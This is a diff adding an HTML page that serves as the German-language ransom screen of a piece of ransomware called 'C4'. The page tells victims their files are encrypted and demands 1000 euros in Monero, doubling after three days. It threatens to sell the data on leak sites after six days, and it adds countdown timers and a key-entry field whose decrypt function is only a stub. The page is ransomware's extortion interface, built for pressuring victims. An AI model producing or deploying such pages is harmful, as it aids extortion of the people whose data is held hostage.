@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C4-Krypto Entschlüsselung</title>
+<style>
+body {
+	background-color: #202020;
+	color: #E0E0E0;
+	font-family: Arial, sans-serif;
+	margin: 0;
+	padding: 0;
+	display: flex;
+	flex-direction: column;
+	height: 100vh;
+	overflow: hidden;
+}
+
+header {
+	background-color: #333333;
+	width: 100%;
+	padding: 20px;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+}
+
+.logo {
+	width: 100px;
+	height: auto;
+	margin-right: 20px;
+}
+
+h1 {
+	color: #1A73E8;
+	font-size: 36px;
+}
+
+.container {
+	display: flex;
+	flex-direction: column;
+	height: 100%;
+}
+
+.top-section {
+	background-color: #FF0000;
+	color: #333333;
+	flex: 2;
+	display: flex;
+	align-items: center;
+	padding: 20px;
+}
+
+.bottom-section {
+	background-color: #FFFFFF;
+	color: #000000;
+	flex: 1;
+	padding: 20px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.section {
+	margin-bottom: 20px;
+}
+
+.section h2 {
+	color: #4CAF50;
+	margin-bottom: 10px;
+}
+
+.section p {
+	margin-bottom: 10px;
+}
+
+.button {
+	background-color: #1A73E8;
+	color: white;
+	padding: 8px 16px;
+	border: none;
+	border-radius: 4px;
+	cursor: pointer;
+	margin-top: 10px;
+}
+
+.button:hover {
+	background-color: #0056b3;
+}
+
+input[type="text"], input[type="password"], textarea {
+	width: 100%;
+	padding: 10px;
+	margin-bottom: 10px;
+	border: 1px solid #4CAF50;
+	border-radius: 4px;
+	background-color: #2D2D2D;
+	color: #E0E0E0;
+}
+
+.countdown {
+	font-size: 18px;
+	margin-top: 10px;
+}
+</style>
+</head>
+
+<body>
+<header>
+<img class="logo" src="biohazard.png" alt="C4-Ransomware Logo">
+<h1>C4 Krypto-Area</h1>
+</header>
+
+<div class="container">
+<div class="top-section">
+<div>
+<h1>Entschlüsselungssystem</h1>
+<p>Die C4 Crypto-Software hat ihre Daten Verschlüsselt.Um ihre Daten wieder herzustellen, brauen sie den erforderlichen Key! Um diesen zu bekommen, ist eine Zahlung von 1000 € in Monero innerhalb der unten dargestellten Fristen erforderlich. Nach 3 Tagen wird sich die Gebühr verdoppeln! Wenn dann innerhalb des 6 Tage Countdowns nicht gezahlt wurde, werden wir ihre Daten auf unseren Leak Platformen im Dark, Deep, und Clear Web zum Verkauf angeboten. Bitte geben Sie den Entschlüsselungsschlüssel ein und klicken Sie auf 'Entschlüsseln'.</p>
+</div>
+</div>
+
+<div class="bottom-section">
+<div class="section">
+<input type="text" id="decryption-key" placeholder="Entschlüsselungsschlüssel">
+<button class="button" onclick="decrypt()">Entschlüsseln</button>
+</div>
+
+<div class="section">
+<div class="countdown" id="countdown-3d">3 Tage Countdown: <span id="timer-3d"></span></div>
+<div class="countdown" id="countdown-6d">6 Tage Countdown: <span id="timer-6d"></span></div>
+</div>
+
+<div class="section">
+<textarea id="decryption-notes" placeholder="DECRYPT.md Inhalt wird hier angezeigt..."></textarea>
+</div>
+</div>
+</div>
+
+<script>
+function startCountdown(elementId, duration) {
+	const timerElement = document.getElementById(elementId);
+	const endTime = Date.now() + duration * 1000;
+	
+	function updateTimer() {
+		const now = Date.now();
+		const remaining = endTime - now;
+		if (remaining <= 0) {
+			timerElement.textContent = "Countdown abgelaufen!";
+			return;
+		}
+		
+		const minutes = Math.floor((remaining / 1000 / 60) % 60);
+		const seconds = Math.floor((remaining / 1000) % 60);
+		timerElement.textContent = `${minutes}m ${seconds}s`;
+		setTimeout(updateTimer, 1000);
+	}
+	
+	updateTimer();
+}
+
+function decrypt() {
+	const key = document.getElementById('decryption-key').value;
+	// Hier sollte die Entschlüsselungslogik implementiert werden
+	alert('Entschlüsselung läuft mit Schlüssel: ' + key);
+}
+
+// Starte die Countdowns
+startCountdown('timer-3d', 3 * 24 * 60 * 60); // 3 Tage in Sekunden
+startCountdown('timer-6d', 6 * 24 * 60 * 60); // 6 Tage in Sekunden
+</script>
+</body>
+
+</html>
